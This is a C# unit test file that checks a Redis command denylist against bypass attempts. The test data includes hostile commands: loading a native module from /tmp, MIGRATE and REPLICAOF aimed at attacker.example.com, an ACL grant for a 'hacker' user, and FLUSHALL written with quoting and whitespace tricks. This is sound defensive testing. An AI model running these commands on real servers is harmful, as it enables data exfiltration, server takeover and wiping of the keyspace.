using Airside.Core.Common;
using Airside.Runtime.Queries;

namespace Airside.Tests.Queries;

/// <summary>
/// The command policy, attacked rather than demonstrated.
/// </summary>
/// <remarks>
/// Every test below is a bypass a <c>StartsWith</c> denylist would fall for. If
/// any of them starts passing a blocked command, the control is gone while still
/// looking present, which is worse than not having it.
/// </remarks>
public class RedisCommandPolicyTests
{
    private static readonly RedisCommandPolicy Policy = new();

    private static Result Evaluate(string statement, bool elevated = false) =>
        Policy.Evaluate(statement, elevated);

    [Theory]
    [InlineData("GET mykey")]
    [InlineData("SET mykey value")]
    [InlineData("SCAN 0 MATCH user:* COUNT 100")]
    [InlineData("INFO persistence")]
    [InlineData("TTL session:1")]
    [InlineData("CONFIG GET maxmemory")]
    [InlineData("CLIENT LIST")]
    public void OrdinaryCommands_AreAllowedWithoutElevation(string command)
    {
        Assert.True(Evaluate(command).IsSuccess, $"'{command}' should be allowed.");
    }

    [Theory]
    [InlineData("MODULE LOAD /tmp/evil.so")]
    [InlineData("MIGRATE attacker.example.com 6379 mykey 0 5000")]
    [InlineData("REPLICAOF attacker.example.com 6379")]
    [InlineData("SLAVEOF attacker.example.com 6379")]
    [InlineData("DEBUG SEGFAULT")]
    [InlineData("MONITOR")]
    [InlineData("ACL SETUSER hacker on >pw ~* +@all")]
    public void CompromisePrimitives_AreBlockedEvenWithElevation(string command)
    {
        // These are not destructive, they are takeover. MODULE LOAD is native
        // code execution; MIGRATE exfiltrates to a host of the caller's choosing;
        // REPLICAOF replaces the dataset from an attacker's server; ACL escapes
        // Airside's own authorisation model.
        var result = Evaluate(command, elevated: true);

        Assert.True(result.IsFailure, $"'{command}' must never be permitted.");
        Assert.Equal(ErrorCodes.QueryCommandBlocked, result.Failure!.Code);
    }

    [Theory]
    [InlineData("KEYS *")]
    [InlineData("FLUSHALL")]
    [InlineData("FLUSHDB")]
    [InlineData("SHUTDOWN")]
    [InlineData("CONFIG SET maxmemory 0")]
    public void DestructiveCommands_RequireElevation(string command)
    {
        var denied = Evaluate(command);

        Assert.True(denied.IsFailure, $"'{command}' should need elevation.");
        Assert.Equal(ErrorCodes.QueryCommandRequiresElevation, denied.Failure!.Code);
        Assert.Equal(
            Airside.Core.Security.Permissions.DatabaseQueryDestructive,
            denied.Failure.Metadata!["requiredPermission"]);

        Assert.True(Evaluate(command, elevated: true).IsSuccess, $"'{command}' should pass with elevation.");
    }

    [Theory]
    [InlineData("flushall")]
    [InlineData("FlUsHaLl")]
    [InlineData("  FLUSHALL")]
    [InlineData("\tFLUSHALL")]
    [InlineData("\n  flushall  ")]
    public void CasingAndLeadingWhitespace_DoNotBypassTheCheck(string command)
    {
        // The classic denylist bypass: press space first.
        Assert.True(Evaluate(command).IsFailure, $"'{command}' must not slip through.");
    }

    [Theory]
    [InlineData("\"FLUSHALL\"")]
    [InlineData("'FLUSHALL'")]
    [InlineData("FLUSH\"ALL\"")]
    [InlineData("\"FLUSH\"ALL")]
    public void QuotingTheCommandName_DoesNotBypassTheCheck(string command)
    {
        // The subtle one. redis-cli accepts a quoted command name and executes it,
        // so a policy comparing the raw string sees "FLUSHALL" with quotes, finds
        // no match, and waves through a keyspace wipe.
        Assert.True(Evaluate(command).IsFailure, $"'{command}' must not slip through.");
    }

    [Fact]
    public void QuotedArguments_AreLeftIntact()
    {
        Assert.True(Evaluate("SET greeting \"hello world\"").IsSuccess);

        var tokens = RedisCommandTokenizer.Tokenize("SET greeting \"hello world\"");

        Assert.Equal(["SET", "greeting", "hello world"], tokens);
    }

    [Fact]
    public void EscapedQuotesInsideDoubleQuotes_AreHonoured()
    {
        var tokens = RedisCommandTokenizer.Tokenize("SET k \"a \\\"quoted\\\" value\"");

        Assert.Equal(["SET", "k", "a \"quoted\" value"], tokens);
    }

    [Fact]
    public void UnterminatedQuote_IsRejectedRatherThanGuessed()
    {
        var result = Evaluate("SET k \"unterminated");

        Assert.True(result.IsFailure);
        Assert.Equal(ErrorCodes.ValidationFailed, result.Failure!.Code);
    }

    [Fact]
    public void EmptyStatement_IsRejected()
    {
        Assert.True(Evaluate("   ").IsFailure);
        Assert.True(Evaluate(string.Empty).IsFailure);
    }

    [Fact]
    public void ConfigGet_IsAllowedButConfigSet_IsNot()
    {
        // Subcommand-sensitive: reading configuration is harmless, writing it can
        // disable persistence or move maxmemory out from under the platform's own
        // accounting.
        Assert.True(Evaluate("CONFIG GET appendonly").IsSuccess);
        Assert.True(Evaluate("CONFIG SET appendonly no").IsFailure);
        Assert.True(Evaluate("config set appendonly no").IsFailure);
    }

    [Fact]
    public void ClientList_IsAllowedButClientKill_IsNot()
    {
        Assert.True(Evaluate("CLIENT LIST").IsSuccess);
        Assert.True(Evaluate("CLIENT KILL ID 4").IsFailure);
    }

    [Fact]
    public void ScriptingIsElevated_BecauseItRunsArbitraryLua()
    {
        Assert.True(Evaluate("EVAL \"return 1\" 0").IsFailure);
        Assert.True(Evaluate("EVAL \"return 1\" 0", elevated: true).IsSuccess);
    }

    [Fact]
    public void BlockedCommandError_NamesTheCommand()
    {
        var result = Evaluate("module load /tmp/x.so", elevated: true);

        Assert.Equal("MODULE", result.Failure!.Metadata!["command"]);
    }

    [Fact]
    public void KeysError_PointsAtScan()
    {
        // The message has to teach, not just refuse: SCAN is the answer, and an
        // operator who is told that stops asking for the destructive permission.
        var result = Evaluate("KEYS *");

        Assert.Contains("SCAN", result.Failure!.Message, StringComparison.Ordinal);
    }
}

public class PermissiveCommandPolicyTests
{
    [Fact]
    public void SqlConsole_AllowsAnythingNonEmpty()
    {
        // Deliberate. Blocking DROP TABLE while allowing UPDATE without a WHERE
        // is theatre; the real control is database.query being a separate
        // permission from every infrastructure one.
        var policy = new PermissiveCommandPolicy(Core.Databases.QueryDialect.Sql);

        Assert.True(policy.Evaluate("DROP TABLE users", false).IsSuccess);
        Assert.True(policy.Evaluate("SELECT 1", false).IsSuccess);
        Assert.True(policy.Evaluate("   ", false).IsFailure);
    }
}
